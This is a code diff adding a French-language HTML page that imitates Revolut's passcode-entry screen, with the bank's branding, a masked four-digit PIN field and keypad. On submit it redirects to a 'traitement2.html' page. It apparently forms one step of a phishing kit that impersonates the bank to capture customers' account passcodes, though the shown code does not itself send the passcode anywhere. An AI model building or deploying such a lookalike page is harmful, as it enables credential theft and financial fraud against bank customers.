@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revolut - Passcode</title>
+    <style>
+        :root {
+            --revolut-purple: #5D29FF;
+            --revolut-dark: #1E1F20;
+            --revolut-gray: #F8F9FA;
+            --revolut-text: #1E1F20;
+            --revolut-text-light: #6C6E73;
+            --revolut-border: #E8EAED;
+            --revolut-error: #FF3D57;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--revolut-gray);
+            color: var(--revolut-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .revolut-header {
+            display: flex;
+            justify-content: center;
+            padding: 16px;
+            background: white;
+            box-shadow: 0 1px 0 0 var(--revolut-border);
+        }
+
+        .revolut-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .revolut-logo-img {
+            height: 24px;
+            width: auto;
+        }
+
+        .revolut-logo-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--revolut-purple);
+            letter-spacing: -0.2px;
+        }
+
+        /* Main Content */
+        .revolut-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            max-width: 440px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Passcode Card */
+        .revolut-card {
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            padding: 32px;
+            margin-bottom: 24px;
+        }
+
+        .revolut-auth-logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .revolut-auth-logo img {
+            height: 48px;
+            width: auto;
+        }
+
+        .revolut-title {
+            font-size: 24px;
+            font-weight: 700;
+            line-height: 32px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .revolut-subtitle {
+            font-size: 16px;
+            color: var(--revolut-text-light);
+            line-height: 24px;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        /* Passcode Input */
+        .revolut-passcode-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .revolut-passcode-input {
+            width: 44px;
+            height: 56px;
+            border: 1px solid var(--revolut-border);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            transition: all 0.2s;
+            -webkit-text-security: disc;
+            -moz-text-security: disc;
+            text-security: disc;
+        }
+
+        .revolut-passcode-input:focus {
+            border-color: var(--revolut-purple);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(93, 41, 255, 0.1);
+        }
+
+        .revolut-passcode-input.filled {
+            border-color: var(--revolut-purple);
+        }
+
+        .revolut-passcode-link {
+            display: block;
+            text-align: center;
+            color: var(--revolut-purple);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 32px;
+            transition: color 0.2s;
+        }
+
+        .revolut-passcode-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Keypad */
+        .revolut-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .revolut-key {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 56px;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: 500;
+            background: white;
+            border: 1px solid var(--revolut-border);
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+
+        .revolut-key:active {
+            background-color: var(--revolut-gray);
+        }
+
+        .revolut-key-special {
+            font-size: 16px;
+            color: var(--revolut-purple);
+        }
+
+        /* Footer */
+        .revolut-footer {
+            text-align: center;
+            padding: 16px;
+            color: var(--revolut-text-light);
+            font-size: 14px;
+        }
+
+        /* Loading animation */
+        .revolut-loading {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 8px;
+        }
+
+        .revolut-loading-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+            animation: revolut-loading 1.4s infinite ease-in-out both;
+        }
+
+        .revolut-loading-dot:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+
+        .revolut-loading-dot:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+
+        @keyframes revolut-loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .revolut-card {
+                padding: 24px;
+            }
+            
+            .revolut-auth-logo img {
+                height: 40px;
+            }
+            
+            .revolut-passcode-input {
+                width: 40px;
+                height: 52px;
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="revolut-header">
+        <div class="revolut-logo">
+            <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            <span class="revolut-logo-text"></span>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="revolut-container">
+        <div class="revolut-card">
+            <!-- Logo -->
+            <div class="revolut-auth-logo">
+                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            </div>
+            
+            <h1 class="revolut-title">Entrez votre passcode</h1>
+            <p class="revolut-subtitle">Pour accéder à votre compte Revolut</p>
+            
+            <!-- Passcode Input -->
+            <div class="revolut-passcode-container">
+                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
+            </div>
+            
+            <a href="#" class="revolut-passcode-link">Passcode oublié ?</a>
+            
+            <!-- Keypad -->
+            <div class="revolut-keypad">
+                <div class="revolut-key" data-key="1">1</div>
+                <div class="revolut-key" data-key="2">2</div>
+                <div class="revolut-key" data-key="3">3</div>
+                <div class="revolut-key" data-key="4">4</div>
+                <div class="revolut-key" data-key="5">5</div>
+                <div class="revolut-key" data-key="6">6</div>
+                <div class="revolut-key" data-key="7">7</div>
+                <div class="revolut-key" data-key="8">8</div>
+                <div class="revolut-key" data-key="9">9</div>
+                <div class="revolut-key revolut-key-special" id="clearKey">Effacer</div>
+                <div class="revolut-key" data-key="0">0</div>
+                <div class="revolut-key revolut-key-special" id="submitKey">OK</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="revolut-footer">
+        <p>Vérification en cours<span id="revolutLoadingDots"></span></p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const passcodeInputs = document.querySelectorAll('.revolut-passcode-input');
+            const clearKey = document.getElementById('clearKey');
+            const submitKey = document.getElementById('submitKey');
+            const loadingDots = document.getElementById('revolutLoadingDots');
+            
+            // Focus first input
+            passcodeInputs[0].focus();
+            
+            // Handle passcode input
+            passcodeInputs.forEach((input, index) => {
+                // Move to next input when a digit is entered
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        if (index < passcodeInputs.length - 1) {
+                            passcodeInputs[index + 1].focus();
+                        }
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        passcodeInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Handle keypad clicks
+            document.querySelectorAll('.revolut-key[data-key]').forEach(key => {
+                key.addEventListener('click', function() {
+                    const digit = this.getAttribute('data-key');
+                    const emptyInput = Array.from(passcodeInputs).find(input => input.value === '');
+                    if (emptyInput) {
+                        emptyInput.value = digit;
+                        emptyInput.classList.add('filled');
+                        const nextIndex = Array.from(passcodeInputs).indexOf(emptyInput) + 1;
+                        if (nextIndex < passcodeInputs.length) {
+                            passcodeInputs[nextIndex].focus();
+                        }
+                    }
+                });
+            });
+            
+            // Clear button
+            clearKey.addEventListener('click', function() {
+                passcodeInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                passcodeInputs[0].focus();
+            });
+            
+            // Submit button
+            submitKey.addEventListener('click', function() {
+                const passcode = Array.from(passcodeInputs).map(input => input.value).join('');
+                if (passcode.length === 4) {
+                    // Show loading dots
+                    let dots = 0;
+                    const dotInterval = setInterval(() => {
+                        dots = (dots + 1) % 4;
+                        loadingDots.textContent = '.'.repeat(dots);
+                    }, 500);
+                    
+                    // Disable keypad
+                    document.querySelectorAll('.revolut-key').forEach(key => {
+                        key.style.pointerEvents = 'none';
+                        key.style.opacity = '0.6';
+                    });
+                    
+                    // Redirect after delay
+                    setTimeout(() => {
+                        clearInterval(dotInterval);
+                        window.location.href = 'traitement2.html';
+                    }, 1500);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
